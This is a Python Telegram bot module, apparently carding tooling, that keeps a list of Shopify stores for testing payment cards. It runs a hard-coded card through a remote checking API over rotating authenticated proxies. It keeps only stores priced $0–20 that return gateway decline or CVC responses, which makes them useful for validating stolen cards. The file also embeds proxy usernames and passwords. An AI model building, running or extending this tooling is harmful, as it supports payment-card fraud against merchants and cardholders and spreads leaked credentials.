import asyncio
import random
import aiohttp
import os
import time
import re
import logging
import io

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.filters import Command
from aiogram.types import FSInputFile

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ADD YOUR TELEGRAM ID HERE
ADMIN_IDS = [2143826137] 

# Test card to verify site functionality
TEST_CARD = "4000223372377978|05|29|651"

# API Configuration - SAME AS msh.py
API_BASE_URL = "https://hii-production-b7d5.up.railway.app/shopify"
API_TIMEOUT = 30

# Proxy List - Rotated randomly for each check
PROXY_LIST = [
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cl-san.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://OR1673915314:LMf4JcDV@208.196.99.128:8813",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345"
]

# Bad proxies that failed - removed from rotation
BAD_PROXIES = set()

# DEAD ERRORS LIST (Including all step failures)
DEAD_ERRORS = [
    # Original errors
    'site error! status: 404', 'site error! status: 500', 'site error! status: 402', 
    'site error! status: 502', 'site error! 503', 'site error! status: 503',
    'site not supported for now!', 'connection error', 'connection error!', 
    'error processing card', 'failed to get token', 'failed to get checkout', 
    'failed to add to cart', 'site overloaded', 'site rate limited',
    'failed to get session token', 'unable to get payment token', 'no valid products', 
    'site error! status: 403', 'payment method is not shopify!', 'not shopify!', 
    'site error! status: 401', 'site requires login!',
    'timeout', 'http error', 'json', 'proxy', 'curl error', 'could not resolve',
    'connect tunnel failed', 'max retries', 'GENERIC_ERROR',
    
    # Step failures (Site Broken/Dead)
    'step 1 failed', 'step 0 failed', 'step 2 failed', 'step 3 failed', 'step 4 failed',
    'step 5 failed', 'step 6 failed', 'step 7 failed', 'step 9 failed', 'step 10 failed',
    'missing stableid', 'missing buildid', 'missing sourcetoken',
    'could not extract private_access_token',
    'could not find actions js url',
    'missing proposal', 'missing submit id',
    'retryable: inventory reservation failure',
    'exceeded 30 poll attempts',
    'could not extract queuetoken',
    'could not extract identification signature',
    'could not extract session id',
    'could not extract delivery handle',
    'could not extract signedhandles',
    'could not extract shipping amount',
    'could not extract total amount',
    'could not extract receiptid',
    'could not extract sessiontoken',
    'errstoreincompatible', 'errmissingreceiptid'
]

# List of valid gateway responses (Site is Alive)
SUCCESS_RESPONSES = [
    'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS', 
    'GENERIC_DECLINE', 'DO NOT HONOR', 'UNKNOWN_ERROR', 'Processing Error', 'EXPIRED_CARD',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED', '3DS_REQUIRED', 'AMOUNT_TOO_SMALL',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'ORDER_PAID', 'INCORRECT_NUMBER',
]

# Router for this module
router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def is_admin(user_id):
    """Check if user is admin"""
    return user_id in ADMIN_IDS

def read_sites():
    """Read sites from sites.txt file - returns list without duplicates"""
    if not os.path.exists("sites.txt"):
        return []
    with open("sites.txt", "r", encoding="utf-8") as f:
        # Automatically remove duplicates when reading
        sites = list(set([line.strip() for line in f if line.strip()]))
    return sites

def write_sites(sites_list):
    """Write sites to sites.txt file - ENSURES NO DUPLICATES"""
    # Convert to set to remove duplicates, then back to list
    unique_sites = list(set(sites_list))
    
    with open("sites.txt", "w", encoding="utf-8") as f:
        for site in unique_sites:
            f.write(f"{site}\n")
    
    return len(unique_sites)

def normalize_url(url: str) -> str:
    """
    Normalize URL to prevent duplicates with slight variations
    
    Examples:
    - https://example.com/ -> https://example.com
    - https://EXAMPLE.COM -> https://example.com
    - https://example.com/// -> https://example.com
    """
    url = url.strip().lower()
    
    # Remove trailing slash
    url = url.rstrip('/')
    
    # Remove www. prefix for consistency
    if url.startswith('www.'):
        url = url[4:]
    
    return url

def get_random_proxy():
    """Get a random proxy that isn't in the bad list"""
    global BAD_PROXIES
    available = [p for p in PROXY_LIST if p not in BAD_PROXIES]
    if not available:
        # Reset bad proxies if all are bad
        BAD_PROXIES.clear()
        available = PROXY_LIST
    return random.choice(available)

def mark_proxy_bad(proxy):
    """Mark a proxy as bad"""
    global BAD_PROXIES
    BAD_PROXIES.add(proxy)

async def call_site_check_api(site_url: str, cc_formatted: str, proxy: str) -> dict:
    """
    Call the cxchk.shopii API for site checking
    
    API Endpoint: http://core.cxchk.site/shopii?site=<url>&cc=<card>&proxy=<proxy>
    
    Response Format:
    {
      "Gateway": "Shopify Payments",
      "Price": "16.95",
      "Proxy": "Live",
      "Response": "GENERIC_ERROR",
      "Status": "false",
      "cc": "5402563006271217|08|30|140"
    }
    
    Returns dict with keys: success, response, price, proxy_status, gateway, error
    """
    api_url = f"{API_BASE_URL}?site={site_url}&cc={cc_formatted}&proxy={proxy}"
    
    try:
        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                timeout=timeout,
                ssl=False
            ) as resp:
                if resp.status != 200:
                    return {
                        "success": False,
                        "response": f"HTTP Error {resp.status}",
                        "price": "-1.0",
                        "proxy_status": "Dead",
                        "gateway": "",
                        "error": f"HTTP_{resp.status}"
                    }
                
                try:
                    data = await resp.json()
                except Exception:
                    return {
                        "success": False,
                        "response": "Invalid JSON Response",
                        "price": "-1.0",
                        "proxy_status": "Dead",
                        "gateway": "",
                        "error": "JSON_PARSE_ERROR"
                    }
                
                response_msg = data.get("Response", "Unknown")
                price_str = data.get("Price", "-1.0")
                proxy_raw = data.get("Proxy", "Dead")
                gateway = data.get("Gateway", "")
                status = data.get("Status", "false")
                
                if "live" in str(proxy_raw).lower():
                    proxy_status = "Live"
                else:
                    proxy_status = "Dead"
                
                return {
                    "success": True,
                    "response": response_msg,
                    "price": price_str,
                    "proxy_status": proxy_status,
                    "gateway": gateway,
                    "status": status,
                    "error": None
                }
                
    except asyncio.TimeoutError:
        return {
            "success": False,
            "response": "Timeout Error",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "error": "TIMEOUT"
        }
    except aiohttp.ClientConnectorError as e:
        error_str = str(e).lower()
        if "proxy" in error_str or "tunnel" in error_str:
            return {
                "success": False,
                "response": f"Proxy Error: {str(e)[:60]}",
                "price": "-1.0",
                "proxy_status": "Dead",
                "gateway": "",
                "error": "PROXY_ERROR"
            }
        return {
            "success": False,
            "response": f"Connection Error: {str(e)[:60]}",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "error": "CONNECTION_ERROR"
        }
    except aiohttp.ClientError as e:
        return {
            "success": False,
            "response": f"Client Error: {str(e)[:60]}",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "error": "CLIENT_ERROR"
        }
    except Exception as e:
        return {
            "success": False,
            "response": f"Error: {str(e)[:60]}",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "error": "UNKNOWN_ERROR"
        }

async def check_site_status(site_url: str) -> tuple:
    """
    Checks a single site using the API with a test card.
    
    Returns: (site_url, status, data_dict, final_response_string)
    - status: "KEEP", "REMOVE", "ERROR"
    """
    MAX_RETRIES = 3
    
    for attempt in range(MAX_RETRIES):
        proxy = get_random_proxy()
        
        result = await call_site_check_api(
            site_url=site_url,
            cc_formatted=TEST_CARD,
            proxy=proxy
        )
        
        response_msg = result.get("response", "Unknown")
        price_str = result.get("price", "-1.0")
        proxy_status = result.get("proxy_status", "Dead")
        error_type = result.get("error")
        
        if proxy_status and proxy_status.lower() != "live":
            mark_proxy_bad(proxy)
            
            if error_type in ["PROXY_ERROR", "TIMEOUT", "CONNECTION_ERROR"]:
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(0.5)
                    continue
        
        # Check for Hard Errors (Site Dead)
        is_dead = False
        response_lower = response_msg.lower()
        
        for err in DEAD_ERRORS:
            if err.lower() in response_lower:
                is_dead = True
                break
        
        if not result.get("success"):
            if error_type in ["JSON_PARSE_ERROR", "HTTP_500", "HTTP_502", "HTTP_503", "HTTP_404"]:
                is_dead = True
        
        if is_dead:
            return site_url, "REMOVE", {"Price": -1.0}, response_msg

        # Check for Valid Gateway Response (Site is Alive)
        if any(x in response_msg.upper() for x in SUCCESS_RESPONSES):
            actual_price = -1.0
            if price_str and price_str != "-1.0":
                clean_price = re.sub(r'[^\d.]', '', str(price_str))
                if clean_price:
                    try:
                        actual_price = float(clean_price)
                    except ValueError:
                        actual_price = -1.0
            
            # PRICE CONSTRAINT: Must be between $0 and $20
            if 0.00 <= actual_price <= 20.00:
                msg_display = f"${actual_price:.2f} | {response_msg}"
                return site_url, "KEEP", {"Price": actual_price}, msg_display
            else:
                return site_url, "REMOVE", {"Price": actual_price}, f"Price ${actual_price:.2f} (Rejected) | {response_msg}"

        # Fallback - if we got a valid response but don't recognize it
        if result.get("success"):
            return site_url, "KEEP", {"Price": 0.0}, f"Unknown Response: {response_msg}"
        
        return site_url, "REMOVE", {"Price": -1.0}, response_msg

    return site_url, "ERROR", {"Price": -1.0}, "Max Retries Reached"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND WORKER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_site_checker(bot: Bot, chat_id: int, sites_to_check, command_name="Audit", status_message_id=None):
    """Run site checking process in background with DUPLICATE PREVENTION"""
    global BAD_PROXIES
    # Reset bad proxies for fresh start
    BAD_PROXIES.clear()
    
    total_sites = len(sites_to_check)
    valid_sites = []
    working_sites_content = []
    checked_count = 0
    live_count = 0
    dead_count = 0
    duplicate_count = 0
    
    last_edit_time = 0
    MIN_EDIT_INTERVAL = 2.0
    CHECKS_PER_UPDATE = 10 
    sem = asyncio.Semaphore(50)
    
    # Get existing sites for duplicate checking (for /addsite command)
    existing_sites = set()
    if command_name == "Adding":
        existing_sites = set(await asyncio.to_thread(read_sites))
        print(f"[SITECHK] Found {len(existing_sites)} existing sites for duplicate check")

    async def worker(site):
        async with sem:
            return await check_site_status(site)
    
    tasks = [worker(site) for site in sites_to_check]
    
    for future in asyncio.as_completed(tasks):
        try:
            site, status, data, resp_msg = await future
        except Exception as e:
            checked_count += 1
            dead_count += 1
            print(f"[LOG] {site} | Error: {e}")
            continue
            
        checked_count += 1
        print(f"[LOG] {site} | {resp_msg}")

        if status == "KEEP":
            # NORMALIZE URL FOR DUPLICATE CHECK
            normalized_site = normalize_url(site)
            
            # Check if already exists (for Adding mode)
            if command_name == "Adding":
                normalized_existing = {normalize_url(s) for s in existing_sites}
                if normalized_site in normalized_existing:
                    duplicate_count += 1
                    print(f"[DUPLICATE SKIPPED] {site} already exists!")
                    continue
                
                # Also check if already added in this batch
                normalized_valid = {normalize_url(s) for s in valid_sites}
                if normalized_site in normalized_valid:
                    duplicate_count += 1
                    print(f"[DUPLICATE SKIPPED] {site} duplicate in batch!")
                    continue
            
            live_count += 1
            valid_sites.append(site)
            price = data.get("Price", "0.00") if isinstance(data, dict) else "0.00"
            if isinstance(price, float):
                price = f"${price:.2f}"
            working_sites_content.append(f"{site} | Price: {price} | Response: {resp_msg}")
        else:
            dead_count += 1

        current_time = time.time()
        if (current_time - MIN_EDIT_INTERVAL > last_edit_time) or (checked_count % CHECKS_PER_UPDATE == 0):
            try:
                if status_message_id:
                    dup_text = ""
                    if duplicate_count > 0:
                        dup_text = f"\n🔄 <b>Duplicates Skipped:</b> <code>{duplicate_count}</code>"
                    
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_message_id,
                        text=f"🔄 <b>{command_name}ing {total_sites} Sites...</b>\n"
                        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                        f"✅ <b>Kept ($0-20):</b> <code>{live_count}</code>\n"
                        f"❌ <b>Rejected:</b> <code>{dead_count}</code>\n"
                        f"🔄 <b>Checked:</b> <code>{checked_count}/{total_sites}</code>\n"
                        f"🌐 <b>Proxies Available:</b> <code>{len(PROXY_LIST) - len(BAD_PROXIES)}/{len(PROXY_LIST)}</code>"
                        f"{dup_text}",
                        parse_mode="HTML"
                    )
                    last_edit_time = current_time
            except Exception:
                pass 

    # FINAL DEDUPLICATION before saving
    final_unique_sites = []
    seen_normalized = set()
    
    for site in valid_sites:
        normalized = normalize_url(site)
        if normalized not in seen_normalized:
            seen_normalized.add(normalized)
            final_unique_sites.append(site)
    
    removed_dupes = len(valid_sites) - len(final_unique_sites)
    if removed_dupes > 0:
        print(f"[SITECHK] Removed {removed_dupes} internal duplicates before saving")
    
    # Save results based on command type
    if command_name == "Audit":
        saved_count = await asyncio.to_thread(write_sites, final_unique_sites)
    elif command_name == "Adding":
        # Merge with existing, ensuring no duplicates
        existing = await asyncio.to_thread(read_sites)
        existing_normalized = {normalize_url(s) for s in existing}
        
        combined = list(existing)
        for new_site in final_unique_sites:
            norm_new = normalize_url(new_site)
            if norm_new not in existing_normalized:
                combined.append(new_site)
                existing_normalized.add(norm_new)
        
        saved_count = await asyncio.to_thread(write_sites, combined)

    # Generate report file
    filename = f"report_{command_name.lower()}_{int(time.time())}.txt"
    
    file_content = "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    file_content += f"TOTAL CHECKED: {total_sites}\n"
    file_content += f"WORKING SITES (Price $0-20): {len(final_unique_sites)}\n"
    file_content += f"REJECTED (Dead/High Price): {dead_count}\n"
    if duplicate_count > 0 or removed_dupes > 0:
        file_content += f"DUPLICATES SKIPPED: {duplicate_count + removed_dupes}\n"
    file_content += f"PROXIES USED: {len(PROXY_LIST)} | BAD: {len(BAD_PROXIES)}\n"
    file_content += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if working_sites_content:
        file_content += "\n".join(working_sites_content)
    else:
        file_content += "No valid sites found within price range!"

    try:
        def _write_report():
            with open(filename, "w", encoding="utf-8") as f:
                f.write(file_content)
        
        await asyncio.to_thread(_write_report)
        
        if status_message_id:
            try:
                dup_final = ""
                if (duplicate_count + removed_dupes) > 0:
                    dup_final = f"\n🚫 <b>Duplicates Blocked:</b> <code>{duplicate_count + removed_dupes}</code>"
                
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_message_id,
                    text=f"✅ <b>{command_name} Complete!</b>\n\n"
                    f"<b>Total Checked:</b> {total_sites}\n"
                    f"<b>Valid ($0-20):</b> {len(final_unique_sites)} ✅\n"
                    f"<b>Rejected:</b> {dead_count} ❌\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                    f"🌐 <b>Proxies Used:</b> {len(PROXY_LIST)} | <b>Bad:</b> {len(BAD_PROXIES)}"
                    f"{dup_final}",
                    parse_mode="HTML"
                )
            except Exception:
                pass

        await bot.send_document(
            chat_id=chat_id,
            document=FSInputFile(filename),
            caption=f"📜 <b>{command_name} Report (Deduplicated)</b>",
            parse_mode="HTML"
        )
        
        try:
            os.remove(filename)
        except:
            pass
            
    except Exception as e:
        await bot.send_message(chat_id=chat_id, text=f"❌ <b>Error:</b> {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 1: /sitechk (Audit & Clean Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("sitechk"))
async def sitechk_command(message: types.Message):
    """Audit existing sites - removes dead ones and deduplicates"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    bot = message.bot
    chat_id = message.chat.id

    sites = await asyncio.to_thread(read_sites)
    if not sites:
        await message.answer("📭 <b>No sites found in sites.txt</b>", parse_mode="HTML")
        return

    status_msg = await message.answer(
        f"🔄 <b>Starting Audit on {len(sites)} Sites...</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"🔄 <b>Checked:</b> <code>0/{len(sites)}</code>\n"
        f"✅ <b>Kept ($0-20):</b> <code>0</code>\n"
        f"❌ <b>Rejected:</b> <code>0</code>\n"
        f"🌐 <b>Proxies:</b> <code>{len(PROXY_LIST)}</code>",
        parse_mode="HTML"
    )

    asyncio.create_task(
        run_site_checker(
            bot, 
            chat_id,
            sites,
            command_name="Audit",
            status_message_id=status_msg.message_id
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 2: /addsite (Add & Verify New Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("addsite"))
async def addsite_command(message: types.Message):
    """Add new sites from uploaded file - automatically skips duplicates"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    bot = message.bot
    chat_id = message.chat.id

    doc = message.document
    if not doc:
        if message.reply_to_message:
            doc = message.reply_to_message.document
    
    if not doc:
        await message.answer(
            "⚠️ <b>Please reply to a file or upload a file containing sites with /addsite.</b>",
            parse_mode="HTML"
        )
        return

    # Download file content
    try:
        file_info = await bot.get_file(doc.file_id)
        
        destination = io.BytesIO()
        await bot.download_file(file_info.file_path, destination)
        
        destination.seek(0)
        byte_content = destination.read()
        text = byte_content.decode('utf-8', errors='ignore')
        
        # Extract URLs
        url_pattern = r'(https?://\S+)'
        new_sites = []
        lines = text.split('\n')
        
        for line in lines:
            match = re.search(url_pattern, line)
            if match:
                url = match.group(1)
                url = url.rstrip('.,;:!?)\'"')
                new_sites.append(url)
        
        # Remove duplicates from uploaded file itself
        new_sites = list(set(new_sites))
        
        if not new_sites:
            await message.answer("❌ <b>No valid sites found in file.</b>", parse_mode="HTML")
            return
            
    except Exception as e:
        logging.error(f"Error downloading file: {e}", exc_info=True)
        await message.answer(f"❌ <b>Error reading file:</b> {e}", parse_mode="HTML")
        return

    # Send initial status
    status_msg = await message.answer(
        f"🔄 <b>Starting Addition of {len(new_sites)} Sites...</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"🔄 <b>Checked:</b> <code>0/{len(new_sites)}</code>\n"
        f"✅ <b>Added ($0-20):</b> <code>0</code>\n"
        f"❌ <b>Rejected:</b> <code>0</code>\n"
        f"🚫 <b>Duplicates:</b> <code>0</code>\n"
        f"🌐 <b>Proxies:</b> <code>{len(PROXY_LIST)}</code>",
        parse_mode="HTML"
    )

    asyncio.create_task(
        run_site_checker(
            bot,
            chat_id,
            new_sites,
            command_name="Adding",
            status_message_id=status_msg.message_id
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 3: /siteall (List All Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("siteall"))
async def siteall_command(message: types.Message):
    """Download full list of all sites (automatically deduplicated)"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    sites = await asyncio.to_thread(read_sites)
    if not sites:
        await message.answer("📭 <b>sites.txt is empty.</b>", parse_mode="HTML")
        return

    filename = f"full_sites_list_{int(time.time())}.txt"
    
    try:
        def _write_file():
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Total Sites: {len(sites)} (Deduplicated)\n\n")
                f.write("\n".join(sites))
        
        await asyncio.to_thread(_write_file)
        
        await message.answer_document(
            document=FSInputFile(filename),
            caption=f"📜 <b>Total Sites:</b> <code>{len(sites)}</code> ✨ (No Duplicates)",
            parse_mode="HTML"
        )
        os.remove(filename)
    except Exception as e:
        await message.answer(f"❌ <b>Error:</b> {e}", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 4: /removeall (Remove All Sites)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("removeall"))
async def removeall_command(message: types.Message):
    """Clear all sites from sites.txt"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    sites = await asyncio.to_thread(read_sites)
    if not sites:
        await message.answer("📭 <b>sites.txt is already empty.</b>", parse_mode="HTML")
        return

    try:
        def _clear_file():
            with open("sites.txt", "w", encoding="utf-8") as f:
                pass
        
        await asyncio.to_thread(_clear_file)
        
        await message.answer(
            f"✅ <b>All sites have been successfully removed.</b>\n\n"
            f"<b>Removed:</b> <code>{len(sites)}</code> sites",
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ <b>Error:</b> {e}", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 5: /dedupe (Force Deduplicate)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("dedupe"))
async def dedupe_command(message: types.Message):
    """Force deduplicate sites.txt"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return
    
    sites = await asyncio.to_thread(read_sites)
    
    if not sites:
        await message.answer("📭 <b>sites.txt is empty.</b>", parse_mode="HTML")
        return
    
    original_count = len(sites)
    
    # Force write (which auto-deduplicates)
    final_count = await asyncio.to_thread(write_sites, sites)
    
    removed = original_count - final_count
    
    if removed > 0:
        await message.answer(
            f"✨ <b>Deduplication Complete!</b>\n\n"
            f"<b>Original:</b> <code>{original_count}</code>\n"
            f"<b>Removed:</b> <code>{removed}</code> duplicates\n"
            f"<b>Final:</b> <code>{final_count}</code> unique sites",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            f"✅ <b>No duplicates found!</b>\n\n"
            f"<b>Total Sites:</b> <code>{final_count}</code> (All Unique)",
            parse_mode="HTML"
        )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 6: /proxyinfo (Check Proxy Status)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("proxyinfo"))
async def proxyinfo_command(message: types.Message):
    """Show proxy statistics"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    available = len(PROXY_LIST) - len(BAD_PROXIES)
    
    text = (
        f"🌐 <b>Proxy Information</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"📊 <b>Total Proxies:</b> <code>{len(PROXY_LIST)}</code>\n"
        f"✅ <b>Available:</b> <code>{available}</code>\n"
        f"❌ <b>Bad/Dead:</b> <code>{len(BAD_PROXIES)}</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
    )
    
    for i, proxy in enumerate(PROXY_LIST, 1):
        status = "❌ Dead" if proxy in BAD_PROXIES else "✅ Live"
        if "@" in proxy:
            parts = proxy.split("@")
            host_part = parts[1] if len(parts) > 1 else proxy
            text += f"<code>{i}.</code> {host_part} - {status}\n"
        else:
            text += f"<code>{i}.</code> {proxy[:30]}... - {status}\n"
    
    await message.answer(text, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND 7: /resetproxy (Reset Bad Proxies)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(Command("resetproxy"))
async def resetproxy_command(message: types.Message):
    """Reset all bad proxies back to available"""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer("⛔ <b>You are not authorized.</b>", parse_mode="HTML")
        return

    global BAD_PROXIES
    cleared_count = len(BAD_PROXIES)
    BAD_PROXIES.clear()
    
    await message.answer(
        f"✅ <b>Proxy List Reset!</b>\n\n"
        f"<b>Cleared:</b> <code>{cleared_count}</code> bad proxies\n"
        f"<b>Available Now:</b> <code>{len(PROXY_LIST)}</code>",
        parse_mode="HTML"
    )
